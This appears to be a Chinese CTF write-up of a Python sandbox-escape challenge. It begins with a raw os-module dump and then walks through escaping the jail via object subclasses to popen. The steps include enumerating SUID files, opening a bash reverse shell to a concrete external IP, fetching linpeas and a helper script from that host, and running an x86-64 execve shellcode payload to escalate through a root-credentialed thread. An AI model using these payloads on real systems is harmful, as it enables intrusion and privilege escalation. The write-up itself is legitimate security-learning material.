'makedev': <built-in function makedev>, 'ftruncate': <built-in function ftruncate>, 'truncate': <built-in function truncate>, 'posix_fallocate': <built-in function posix_fallocate>, 'posix_fadvise': <built-in function posix_fadvise>, 'putenv': <built-in function putenv>, 'unsetenv': <built-in function unsetenv>, 'strerror': <built-in function strerror>, 'fchdir': <built-in function fchdir>, 'fsync': <built-in function fsync>, 'sync': <built-in function sync>, 'fdatasync': <built-in function fdatasync>, 'WCOREDUMP': <built-in function WCOREDUMP>, 'WIFCONTINUED': <built-in function WIFCONTINUED>, 'WIFSTOPPED': <built-in function WIFSTOPPED>, 'WIFSIGNALED': <built-in function WIFSIGNALED>, 'WIFEXITED': <built-in function WIFEXITED>, 'WEXITSTATUS': <built-in function WEXITSTATUS>, 'WTERMSIG': <built-in function WTERMSIG>, 'WSTOPSIG': <built-in function WSTOPSIG>, 'fstatvfs': <built-in function fstatvfs>, 'statvfs': <built-in function statvfs>, 'confstr': <built-in function confstr>, 'sysconf': <built-in function sysconf>, 'fpathconf': <built-in function fpathconf>, 'pathconf': <built-in function pathconf>, 'abort': <built-in function abort>, 'getloadavg': <built-in function getloadavg>, 'urandom': <built-in function urandom>, 'setresuid': <built-in function setresuid>, 'setresgid': <built-in function setresgid>, 'getresuid': <built-in function getresuid>, 'getresgid': <built-in function getresgid>, 'getxattr': <built-in function getxattr>, 'setxattr': <built-in function setxattr>, 'removexattr': <built-in function removexattr>, 'listxattr': <built-in function listxattr>, 'get_terminal_size': <built-in function get_terminal_size>, 'cpu_count': <built-in function cpu_count>, 'get_inheritable': <built-in function get_inheritable>, 'set_inheritable': <built-in function set_inheritable>, 'get_blocking': <built-in function get_blocking>, 'set_blocking': <built-in function set_blocking>, 'scandir': <built-in function scandir>, 'fspath': <built-in function fspath>, 'getrandom': <built-in function getrandom>, 'memfd_create': <built-in function memfd_create>, 'eventfd': <built-in function eventfd>, 'eventfd_read': <built-in function eventfd_read>, 'eventfd_write': <built-in function eventfd_write>, 'waitstatus_to_exitcode': <built-in function waitstatus_to_exitcode>, 'setns': <built-in function setns>, 'unshare': <built-in function unshare>, 'timerfd_create': <built-in function timerfd_create>, 'timerfd_settime': <built-in function timerfd_settime>, 'timerfd_settime_ns': <built-in function timerfd_settime_ns>, 'timerfd_gettime': <built-in function timerfd_gettime>, 'timerfd_gettime_ns': <built-in function timerfd_gettime_ns>, 'environ': environ({'PATH': '/usr/local/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin', 'HOSTNAME': 'c395e516f305', 'TERM': 'xterm', 'PYTHON_VERSION': '3.14.0rc2', 'PYTHON_SHA256': 'bc62854cf232345bd22c9091a68464e01e056c6473a3fffa84572c8a342da656', 'HOME': '/root', 'SOCAT_PID': '151', 'SOCAT_PPID': '1', 'SOCAT_VERSION': '1.7.4.4', 'SOCAT_SOCKADDR': '172.18.0.2', 'SOCAT_SOCKPORT': '1337', 'SOCAT_PEERADDR': '172.18.0.1', 'SOCAT_PEERPORT': '57058', 'LC_CTYPE': 'C.UTF-8'}), 'F_OK': 0, 'R_OK': 4, 'W_OK': 2, 'X_OK': 1, 'NGROUPS_MAX': 65536, 'TMP_MAX': 238328, 'WCONTINUED': 8, 'WNOHANG': 1, 'WUNTRACED': 2, 'O_RDONLY': 0, 'O_WRONLY': 1, 'O_RDWR': 2, 'O_NDELAY': 2048, 'O_NONBLOCK': 2048, 'O_APPEND': 1024, 'O_DSYNC': 4096, 'O_RSYNC': 1052672, 'O_SYNC': 1052672, 'O_NOCTTY': 256, 'O_CREAT': 64, 'O_EXCL': 128, 'O_TRUNC': 512, 'O_LARGEFILE': 0, 'O_PATH': 2097152, 'O_TMPFILE': 4259840, 'PRIO_PROCESS': 0, 'PRIO_PGRP': 1, 'PRIO_USER': 2, 'O_CLOEXEC': 524288, 'O_ACCMODE': 3, 'O_FSYNC': 1052672, 'SEEK_HOLE': 4, 'SEEK_DATA': 3, 'O_ASYNC': 8192, 'O_DIRECT': 16384, 'O_DIRECTORY': 65536, 'O_NOFOLLOW': 131072, 'O_NOATIME': 262144, 'EX_OK': 0, 'EX_USAGE': 64, 'EX_DATAERR': 65, 'EX_NOINPUT': 66, 'EX_NOUSER': 67, 'EX_NOHOST': 68, 'EX_UNAVAILABLE': 69, 'EX_SOFTWARE': 70, 'EX_OSERR': 71, 'EX_OSFILE': 72, 'EX_CANTCREAT': 73, 'EX_IOERR': 74, 'EX_TEMPFAIL': 75, 'EX_PROTOCOL': 76, 'EX_NOPERM': 77, 'EX_CONFIG': 78, 'ST_RDONLY': 1, 'ST_NOSUID': 2, 'ST_NODEV': 4, 'ST_NOEXEC': 8, 'ST_SYNCHRONOUS': 16, 'ST_MANDLOCK': 64, 'ST_WRITE': 128, 'ST_APPEND': 256, 'ST_NOATIME': 1024, 'ST_NODIRATIME': 2048, 'ST_RELATIME': 4096, 'TFD_NONBLOCK': 2048, 'TFD_CLOEXEC': 524288, 'TFD_TIMER_ABSTIME': 1, 'TFD_TIMER_CANCEL_ON_SET': 2, 'POSIX_FADV_NORMAL': 0, 'POSIX_FADV_SEQUENTIAL': 2, 'POSIX_FADV_RANDOM': 1, 'POSIX_FADV_NOREUSE': 5, 'POSIX_FADV_WILLNEED': 3, 'POSIX_FADV_DONTNEED': 4, 'P_PID': 1, 'P_PGID': 2, 'P_ALL': 0, 'P_PIDFD': 3, 'PIDFD_NONBLOCK': 2048, 'WEXITED': 4, 'WNOWAIT': 16777216, 'WSTOPPED': 2, 'CLD_EXITED': 1, 'CLD_KILLED': 2, 'CLD_DUMPED': 3, 'CLD_TRAPPED': 4, 'CLD_STOPPED': 5, 'CLD_CONTINUED': 6, 'F_LOCK': 1, 'F_TLOCK': 2, 'F_ULOCK': 0, 'F_TEST': 3, 'RWF_DSYNC': 2, 'RWF_HIPRI': 1, 'RWF_SYNC': 4, 'RWF_NOWAIT': 8, 'RWF_APPEND': 16, 'SPLICE_F_MOVE': 1, 'SPLICE_F_NONBLOCK': 2, 'SPLICE_F_MORE': 4, 'POSIX_SPAWN_OPEN': 0, 'POSIX_SPAWN_CLOSE': 1, 'POSIX_SPAWN_DUP2': 2, 'POSIX_SPAWN_CLOSEFROM': 3, 'SCHED_OTHER': 0, 'SCHED_DEADLINE': 6, 'SCHED_FIFO': 1, 'SCHED_NORMAL': 0, 'SCHED_RR': 2, 'SCHED_BATCH': 3, 'SCHED_IDLE': 5, 'SCHED_RESET_ON_FORK': 1073741824, 'CLONE_FS': 512, 'CLONE_FILES': 1024, 'CLONE_NEWNS': 131072, 'CLONE_NEWCGROUP': 33554432, 'CLONE_NEWUTS': 67108864, 'CLONE_NEWIPC': 134217728, 'CLONE_NEWUSER': 268435456, 'CLONE_NEWPID': 536870912, 'CLONE_NEWNET': 1073741824, 'CLONE_NEWTIME': 128, 'CLONE_SYSVSEM': 262144, 'CLONE_THREAD': 65536, 'CLONE_SIGHAND': 2048, 'CLONE_VM': 256, 'XATTR_CREATE': 1, 'XATTR_REPLACE': 2, 'XATTR_SIZE_MAX': 65536, 'RTLD_LAZY': 1, 'RTLD_NOW': 2, 'RTLD_GLOBAL': 256, 'RTLD_LOCAL': 0, 'RTLD_NODELETE': 4096, 'RTLD_NOLOAD': 4, 'RTLD_DEEPBIND': 8, 'GRND_RANDOM': 2, 'GRND_NONBLOCK': 1, 'MFD_CLOEXEC': 1, 'MFD_ALLOW_SEALING': 2, 'MFD_HUGETLB': 4, 'MFD_HUGE_SHIFT': 26, 'MFD_HUGE_MASK': 63, 'MFD_HUGE_64KB': 1073741824, 'MFD_HUGE_512KB': 1275068416, 'MFD_HUGE_1MB': 1342177280, 'MFD_HUGE_2MB': 1409286144, 'MFD_HUGE_8MB': 1543503872, 'MFD_HUGE_16MB': 1610612736, 'MFD_HUGE_32MB': 1677721600, 'MFD_HUGE_256MB': 1879048192, 'MFD_HUGE_512MB': 1946157056, 'MFD_HUGE_1GB': 2013265920, 'MFD_HUGE_2GB': 2080374784, 'MFD_HUGE_16GB': 2281701376, 'EFD_CLOEXEC': 524288, 'EFD_NONBLOCK': 2048, 'EFD_SEMAPHORE': 1, 'pathconf_names': {'PC_ASYNC_IO': 10, 'PC_CHOWN_RESTRICTED': 6, 'PC_FILESIZEBITS': 13, 'PC_LINK_MAX': 0, 'PC_MAX_CANON': 1, 'PC_MAX_INPUT': 2, 'PC_NAME_MAX': 3, 'PC_NO_TRUNC': 7, 'PC_PATH_MAX': 4, 'PC_PIPE_BUF': 5, 'PC_PRIO_IO': 11, 'PC_SOCK_MAXBUF': 12, 'PC_SYNC_IO': 9, 'PC_VDISABLE': 8, 'PC_ALLOC_SIZE_MIN': 18, 'PC_REC_INCR_XFER_SIZE': 14, 'PC_REC_MAX_XFER_SIZE': 15, 'PC_REC_MIN_XFER_SIZE': 16, 'PC_REC_XFER_ALIGN': 17, 'PC_SYMLINK_MAX': 19}, 'confstr_names': {'CS_GNU_LIBC_VERSION': 2, 'CS_GNU_LIBPTHREAD_VERSION': 3, 'CS_LFS64_CFLAGS': 1004, 'CS_LFS64_LDFLAGS': 1005, 'CS_LFS64_LIBS': 1006, 'CS_LFS64_LINTFLAGS': 1007, 'CS_LFS_CFLAGS': 1000, 'CS_LFS_LDFLAGS': 1001, 'CS_LFS_LIBS': 1002, 'CS_LFS_LINTFLAGS': 1003, 'CS_PATH': 0, 'CS_XBS5_ILP32_OFF32_CFLAGS': 1100, 'CS_XBS5_ILP32_OFF32_LDFLAGS': 1101, 'CS_XBS5_ILP32_OFF32_LIBS': 1102, 'CS_XBS5_ILP32_OFF32_LINTFLAGS': 1103, 'CS_XBS5_ILP32_OFFBIG_CFLAGS': 1104, 'CS_XBS5_ILP32_OFFBIG_LDFLAGS': 1105, 'CS_XBS5_ILP32_OFFBIG_LIBS': 1106, 'CS_XBS5_ILP32_OFFBIG_LINTFLAGS': 1107, 'CS_XBS5_LP64_OFF64_CFLAGS': 1108, 'CS_XBS5_LP64_OFF64_LDFLAGS': 1109, 'CS_XBS5_LP64_OFF64_LIBS': 1110, 'CS_XBS5_LP64_OFF64_LINTFLAGS': 1111, 'CS_XBS5_LPBIG_OFFBIG_CFLAGS': 1112, 'CS_XBS5_LPBIG_OFFBIG_LDFLAGS': 1113, 'CS_XBS5_LPBIG_OFFBIG_LIBS': 1114, 'CS_XBS5_LPBIG_OFFBIG_LINTFLAGS': 1115}, 'sysconf_names': {'SC_2_CHAR_TERM': 95, 'SC_2_C_BIND': 47, 'SC_2_C_DEV': 48, 'SC_2_C_VERSION': 96, 'SC_2_FORT_DEV': 49, 'SC_2_FORT_RUN': 50, 'SC_2_LOCALEDEF': 52, 'SC_2_SW_DEV': 51, 'SC_2_UPE': 97, 'SC_2_VERSION': 46, 'SC_AIO_LISTIO_MAX': 23, 'SC_AIO_MAX': 24, 'SC_AIO_PRIO_DELTA_MAX': 25, 'SC_ARG_MAX': 0, 'SC_ASYNCHRONOUS_IO': 12, 'SC_ATEXIT_MAX': 87, 'SC_AVPHYS_PAGES': 86, 'SC_BC_BASE_MAX': 36, 'SC_BC_DIM_MAX': 37, 'SC_BC_SCALE_MAX': 38, 'SC_BC_STRING_MAX': 39, 'SC_CHARCLASS_NAME_MAX': 45, 'SC_CHAR_BIT': 101, 'SC_CHAR_MAX': 102, 'SC_CHAR_MIN': 103, 'SC_CHILD_MAX': 1, 'SC_CLK_TCK': 2, 'SC_COLL_WEIGHTS_MAX': 40, 'SC_DELAYTIMER_MAX': 26, 'SC_EQUIV_CLASS_MAX': 41, 'SC_EXPR_NEST_MAX': 42, 'SC_FSYNC': 15, 'SC_GETGR_R_SIZE_MAX': 69, 'SC_GETPW_R_SIZE_MAX': 70, 'SC_INT_MAX': 104, 'SC_INT_MIN': 105, 'SC_IOV_MAX': 60, 'SC_JOB_CONTROL': 7, 'SC_LINE_MAX': 43, 'SC_LOGIN_NAME_MAX': 71, 'SC_LONG_BIT': 106, 'SC_MAPPED_FILES': 16, 'SC_MB_LEN_MAX': 108, 'SC_MEMLOCK': 17, 'SC_MEMLOCK_RANGE': 18, 'SC_MEMORY_PROTECTION': 19, 'SC_MESSAGE_PASSING': 20, 'SC_MQ_OPEN_MAX': 27, 'SC_MQ_PRIO_MAX': 28, 'SC_NGROUPS_MAX': 3, 'SC_NL_ARGMAX': 119, 'SC_NL_LANGMAX': 120, 'SC_NL_MSGMAX': 121, 'SC_NL_NMAX': 122, 'SC_NL_SETMAX': 123, 'SC_NL_TEXTMAX': 124, 'SC_NPROCESSORS_CONF': 83, 'SC_NPROCESSORS_ONLN': 84, 'SC_NZERO': 109, 'SC_OPEN_MAX': 4, 'SC_PAGESIZE': 30, 'SC_PAGE_SIZE': 30, 'SC_PASS_MAX': 88, 'SC_PHYS_PAGES': 85, 'SC_PII': 53, 'SC_PII_INTERNET': 56, 'SC_PII_INTERNET_DGRAM': 62, 'SC_PII_INTERNET_STREAM': 61, 'SC_PII_OSI': 57, 'SC_PII_OSI_CLTS': 64, 'SC_PII_OSI_COTS': 63, 'SC_PII_OSI_M': 65, 'SC_PII_SOCKET': 55, 'SC_PII_XTI': 54, 'SC_POLL': 58, 'SC_PRIORITIZED_IO': 13, 'SC_PRIORITY_SCHEDULING': 10, 'SC_REALTIME_SIGNALS': 9, 'SC_RE_DUP_MAX': 44, 'SC_RTSIG_MAX': 31, 'SC_SAVED_IDS': 8, 'SC_SCHAR_MAX': 111, 'SC_SCHAR_MIN': 112, 'SC_SELECT': 59, 'SC_SEMAPHORES': 21, 'SC_SEM_NSEMS_MAX': 32, 'SC_SEM_VALUE_MAX': 33, 'SC_SHARED_MEMORY_OBJECTS': 22, 'SC_SHRT_MAX': 113, 'SC_SHRT_MIN': 114, 'SC_SIGQUEUE_MAX': 34, 'SC_SSIZE_MAX': 110, 'SC_STREAM_MAX': 5, 'SC_SYNCHRONIZED_IO': 14, 'SC_THREADS': 67, 'SC_THREAD_ATTR_STACKADDR': 77, 'SC_THREAD_ATTR_STACKSIZE': 78, 'SC_THREAD_DESTRUCTOR_ITERATIONS': 73, 'SC_THREAD_KEYS_MAX': 74, 'SC_THREAD_PRIORITY_SCHEDULING': 79, 'SC_THREAD_PRIO_INHERIT': 80, 'SC_THREAD_PRIO_PROTECT': 81, 'SC_THREAD_PROCESS_SHARED': 82, 'SC_THREAD_SAFE_FUNCTIONS': 68, 'SC_THREAD_STACK_MIN': 75, 'SC_THREAD_THREADS_MAX': 76, 'SC_TIMERS': 11, 'SC_TIMER_MAX': 35, 'SC_TTY_NAME_MAX': 72, 'SC_TZNAME_MAX': 6, 'SC_T_IOV_MAX': 66, 'SC_UCHAR_MAX': 115, 'SC_UINT_MAX': 116, 'SC_UIO_MAXIOV': 60, 'SC_ULONG_MAX': 117, 'SC_USHRT_MAX': 118, 'SC_VERSION': 29, 'SC_WORD_BIT': 107, 'SC_XBS5_ILP32_OFF32': 125, 'SC_XBS5_ILP32_OFFBIG': 126, 'SC_XBS5_LP64_OFF64': 127, 'SC_XBS5_LPBIG_OFFBIG': 128, 'SC_XOPEN_CRYPT': 92, 'SC_XOPEN_ENH_I18N': 93, 'SC_XOPEN_LEGACY': 129, 'SC_XOPEN_REALTIME': 130, 'SC_XOPEN_REALTIME_THREADS': 131, 'SC_XOPEN_SHM': 94, 'SC_XOPEN_UNIX': 91, 'SC_XOPEN_VERSION': 89, 'SC_XOPEN_XCU_VERSION': 90, 'SC_XOPEN_XPG2': 98, 'SC_XOPEN_XPG3': 99, 'SC_XOPEN_XPG4': 100, 'SC_MINSIGSTKSZ': 249}, 'error': <class 'OSError'>, 'waitid_result': <class 'posix.waitid_result'>, 'stat_result': <class 'os.stat_result'>, 'statvfs_result': <class 'os.statvfs_result'>, 'sched_param': <class 'posix.sched_param'>, 'terminal_size': <class 'os.terminal_size'>, 'DirEntry': <class 'posix.DirEntry'>, 'times_result': <class 'posix.times_result'>, 'uname_result': <class 'posix.uname_result'>, '_exit': <built-in function _exit>, 'path': <module 'posixpath' (frozen)>, '_create_environ': <built-in function _create_environ>, 'curdir': '.', 'pardir': '..', 'sep': '/', 'pathsep': ':', 'defpath': '/bin:/usr/bin', 'extsep': '.', 'altsep': None, 'devnull': '/dev/null', 'supports_dir_fd': {<built-in function mkfifo>, <built-in function mkdir>, <built-in function stat>, <built-in function mknod>, <built-in function utime>, <built-in function unlink>, <built-in function rename>, <built-in function chown>, <built-in function symlink>, <built-in function open>, <built-in function readlink>, <built-in function access>, <built-in function chmod>, <built-in function lstat>, <built-in function rmdir>, <built-in function link>}, 'supports_effective_ids': {<built-in function access>}, 'supports_fd': {<built-in function stat>, <built-in function scandir>, <built-in function utime>, <built-in function chown>, <built-in function listdir>, <built-in function truncate>, <built-in function pathconf>, <built-in function chdir>, <built-in function chmod>, <built-in function statvfs>, <built-in function execve>}, 'supports_follow_symlinks': {<built-in function stat>, <built-in function utime>, <built-in function chown>, <built-in function access>, <built-in function link>}, 'SEEK_SET': 0, 'SEEK_CUR': 1, 'SEEK_END': 2, 'makedirs': <function makedirs at 0x739e99b27d70>, 'removedirs': <function removedirs at 0x739e99b50670>, 'renames': <function renames at 0x739e99b528d0>, '_walk_symlinks_as_files': <object object at 0x739e9a4981d0>, 'walk': <function walk at 0x739e99b81850>, 'fwalk': <function fwalk at 0x739e99b819b0>, '_fwalk_walk': 0, '_fwalk_yield': 1, '_fwalk_close': 2, '_fwalk': <function _fwalk at 0x739e99b833d0>, 'execl': <function execl at 0x739e99b83480>, 'execle': <function execle at 0x739e99b83530>, 'execlp': <function execlp at 0x739e99b835e0>, 'execlpe': <function execlpe at 0x739e99b83690>, 'execvp': <function execvp at 0x739e99b83740>, 'execvpe': <function execvpe at 0x739e99b837f0>, '_execvpe': <function _execvpe at 0x739e99b838a0>, 'get_exec_path': <function get_exec_path at 0x739e99b83950>, 'MutableMapping': <class 'collections.abc.MutableMapping'>, 'Mapping': <class 'collections.abc.Mapping'>, '_Environ': <class 'os._Environ'>, 'reload_environ': <function reload_environ at 0x739e99b83a00>, 'getenv': <function getenv at 0x739e99b90510>, 'supports_bytes_environ': True, 'environb': environ({b'PATH': b'/usr/local/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin', b'HOSTNAME': b'c395e516f305', b'TERM': b'xterm', b'PYTHON_VERSION': b'3.14.0rc2', b'PYTHON_SHA256': b'bc62854cf232345bd22c9091a68464e01e056c6473a3fffa84572c8a342da656', b'HOME': b'/root', b'SOCAT_PID': b'151', b'SOCAT_PPID': b'1', b'SOCAT_VERSION': b'1.7.4.4', b'SOCAT_SOCKADDR': b'172.18.0.2', b'SOCAT_SOCKPORT': b'1337', b'SOCAT_PEERADDR': b'172.18.0.1', b'SOCAT_PEERPORT': b'57058', b'LC_CTYPE': b'C.UTF-8'}), 'getenvb': <function getenvb at 0x739e99b90670>, 'fsencode': <function _fscodec.<locals>.fsencode at 0x739e99b907d0>, 'fsdecode': <function _fscodec.<locals>.fsdecode at 0x739e99b90880>, 'P_WAIT': 0, 'P_NOWAIT': 1, 'P_NOWAITO': 1, '_spawnvef': <function _spawnvef at 0x739e99b90720>, 'spawnv': <function spawnv at 0x739e99b90930>, 'spawnve': <function spawnve at 0x739e99b909e0>, 'spawnvp': <function spawnvp at 0x739e99b90a90>, 'spawnvpe': <function spawnvpe at 0x739e99b90b40>, 'spawnl': <function spawnl at 0x739e99b90bf0>, 'spawnle': <function spawnle at 0x739e99b90ca0>, 'spawnlp': <function spawnlp at 0x739e99b90d50>, 'spawnlpe': <function spawnlpe at 0x739e99b90e00>, 'popen': <function popen at 0x739e99b90eb0>, '_wrap_close': <class 'os._wrap_close'>, 'fdopen': <function fdopen at 0x739e99b90f60>, '_fspath': <function _fspath at 0x739e99b91430>, 'PathLike': <class 'os.PathLike'>, 'process_cpu_count': <function process_cpu_count at 0x739e99b914e0>}
```

看到了`popen`

```
().__class__.__base__.__subclasses__()[166].__init__.__globals__["popen"]

().__class__.__base__.__subclasses__()[166].__init__.__globals__["popen"]("ls / -al").read()
```

权限不够要提权

```
().__class__.__base__.__subclasses__()[166].__init__.__globals__["popen"]("find / -user root -perm -4000 -print 2>/dev/null").read()
/usr/bin/passwd
/usr/bin/newgrp
/usr/bin/chfn
/usr/bin/mount
/usr/bin/gpasswd
/usr/bin/umount
/usr/bin/chsh
/usr/lib/openssh/ssh-keysign

().__class__.__base__.__subclasses__()[166].__init__.__globals__["popen"]("ps -ef").read()
Result: UID          PID    PPID  C STIME TTY          TIME CMD
root           1       0  0 03:38 ?        00:00:00 socat TCP-LISTEN:1337,reuseaddr,fork EXEC:python3 /jail.py
root           8       1  0 03:38 ?        00:00:00 socat TCP-LISTEN:1337,reuseaddr,fork EXEC:python3 /jail.py
root           9       8  2 03:38 ?        00:00:00 python3 /jail.py
nobody        11       9  0 03:38 ?        00:00:00 /bin/sh -c ps -ef
nobody        12      11  0 03:38 ?        00:00:00 ps -ef

```

搞半天搞不出来，先弹shell

```bash
().__class__.__base__.__subclasses__()[166].__init__.__globals__["popen"]("bash -c 'bash -i >& /dev/tcp/156.238.233.93/4444 0>&1'").read()
```

用linpeas这个工具测试一下

```bash
wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh
```

没发现有效的信息，准备下载个有洞的sudo然后提权

```bash
wget https://www.sudo.ws/dist/sudo-1.9.16p2.tar.gz
tar xzf sudo-1.9.16p2.tar.gz && cd sudo-1.9.16p2
./configure --disable-gcrypt --prefix=/usr && make && make install
sudo -V
```

安装失败，让AI写个检测脚本

```bash
#!/usr/bin/env bash
# file: thread_cred_audit.sh
# 用法：
#   1) 指定PID:   ./thread_cred_audit.sh 1234
#   2) 指定模式:   ./thread_cred_audit.sh "python3 .*jail\.py"
#   3) 默认尝试:   自动搜索 "python3 .*jail.py"
set -euo pipefail

cyan()  { printf "\033[36m%s\033[0m\n" "$*"; }
yellow(){ printf "\033[33m%s\033[0m\n" "$*"; }
red()   { printf "\033[31m%s\033[0m\n" "$*"; }
bold()  { printf "\033[1m%s\033[0m\n"   "$*"; }

pick_pid() {
  local arg="${1:-}"
  local pid=""
  if [[ -n "$arg" && "$arg" =~ ^[0-9]+$ && -e "/proc/$arg" ]]; then
    pid="$arg"
  elif [[ -n "$arg" ]]; then
    # 通过模式找
    local line
    line="$(pgrep -af "$arg" | head -n1 || true)"
    [[ -n "$line" ]] && pid="$(awk '{print $1}' <<<"$line")"
  else
    # 默认找 jail.py
    local line
    line="$(pgrep -af 'python3 .*jail\.py' | head -n1 || true)"
    [[ -n "$line" ]] && pid="$(awk '{print $1}' <<<"$line")"
  fi
  [[ -z "$pid" ]] && { red "未找到目标进程。请传入 PID 或匹配模式。"; exit 1; }
  echo "$pid"
}

pid="$(pick_pid "${1:-}")"
[[ -r "/proc/$pid/status" ]] || { red "无权读取 /proc/$pid/status（可能被 hidepid 或权限限制）"; exit 1; }

bold "== 目标进程：PID $pid =="
name=$(awk '/^Name:/{print $2}' /proc/$pid/status)
uidline=$(awk '/^Uid:/{print $2,$3,$4,$5}' /proc/$pid/status)
gidline=$(awk '/^Gid:/{print $2,$3,$4,$5}' /proc/$pid/status)
threads=$(awk '/^Threads:/{print $2}' /proc/$pid/status)
echo "Name: $name"
echo "Uid (R/E/S/FS): $uidline"
echo "Gid (R/E/S/FS): $gidline"
echo "Threads: $threads"
echo

bold "== 线程凭据一览 =="
printf "%-8s %-12s %-12s %-8s %-s\n" "TID" "Uid(R/E/S)" "Gid(R/E/S)" "State" "Comm"
declare -A seen_euids=()
while IFS= read -r d; do
  tid="${d##*/}"
  st="/proc/$pid/task/$tid/status"
  [[ -r "$st" ]] || continue
  read ruid euid suid fsuid < <(awk '/^Uid:/{print $2,$3,$4,$5}' "$st")
  read rgid egid sgid fsgid < <(awk '/^Gid:/{print $2,$3,$4,$5}' "$st")
  state=$(awk -F'\t' '/^State:/{print $2}' "$st")
  comm=$(awk -F'\t' '/^Name:/{print $2}' "$st")
  printf "%-8s %-12s %-12s %-8s %-s\n" "$tid" "$ruid/$euid/$suid" "$rgid/$egid/$sgid" "$state" "$comm"
  seen_euids["$euid"]=1
done < <(ls -1 /proc/$pid/task)

echo
if (( ${#seen_euids[@]} > 1 )); then
  red "⚠ 检测到不同的 EUID 存在于同一进程的不同线程中（线程级降权/不一致）——此为题目核心风险点。"
else
  yellow "未观察到 EUID 差异。但注意：竞态窗口仍可能瞬时存在，单次快照不代表绝对安全。"
fi

cyan "提示：将以上输出截图/保存，可作为 CTF 题解的证据材料。"

```

下载检测一下

```bash
wget http://156.238.233.93:9999/1.sh

nobody@b46f2ce4e8f7:/tmp$ pgrep -af 'python3 .*jail\.py'
pgrep -af 'python3 .*jail\.py'
1 socat TCP-LISTEN:1337,reuseaddr,fork EXEC:python3 /jail.py
521 socat TCP-LISTEN:1337,reuseaddr,fork EXEC:python3 /jail.py
522 python3 /jail.py
nobody@b46f2ce4e8f7:/tmp$ ./1.sh 522
./1.sh 522
== 目标进程：PID 522 ==
Name: python3
Uid (R/E/S/FS): 0 0 0 0
Gid (R/E/S/FS): 65534 65534 65534 65534
Threads: 2

== 线程凭据一览 ==
TID      Uid(R/E/S)   Gid(R/E/S)   State    Comm
522      0/0/0        65534/65534/65534 S (sleeping) python3
523      65534/65534/65534 65534/65534/65534 S (sleeping) Thread-1 (safe_

```

同一进程不同进程用shellcode打 https://ewontfix.com/17/#:~:text=Now

```bash
().__class__.__base__.__subclasses__()[166].__init__.__globals__['__builtins__']['exec']("ctypes=__import__('ctypes');m=__import__('o'+'s');libc=ctypes.CDLL(None);PROT_READ,PROT_WRITE,PROT_EXEC=1,2,4;MAP_PRIVATE,MAP_ANONYMOUS=2,32;SIGUSR1=10;SYS_TGKILL=234;size=0x1000;mm=libc.mmap;mm.restype=ctypes.c_void_p;addr=mm(0,size,PROT_READ|PROT_WRITE|PROT_EXEC,MAP_PRIVATE|MAP_ANONYMOUS,-1,0);sc=b'\\x48\\x31\\xd2\\x48\\xbb\\x2f\\x62\\x69\\x6e\\x2f\\x73\\x68\\x00\\x53\\x48\\x89\\xe7\\x50\\x57\\x48\\x89\\xe6\\xb0\\x3b\\x0f\\x05';ctypes.memmove(addr,sc,len(sc));CB=ctypes.CFUNCTYPE(None,ctypes.c_int);handler=ctypes.cast(addr,CB);libc.signal.argtypes=(ctypes.c_int,CB);libc.signal.restype=CB;libc.signal(SIGUSR1,handler);pid=m.getpid();libc.syscall(SYS_TGKILL,pid,pid,SIGUSR1)",().__class__.__base__.__subclasses__()[166].__init__.__globals__['__builtins__'])
```

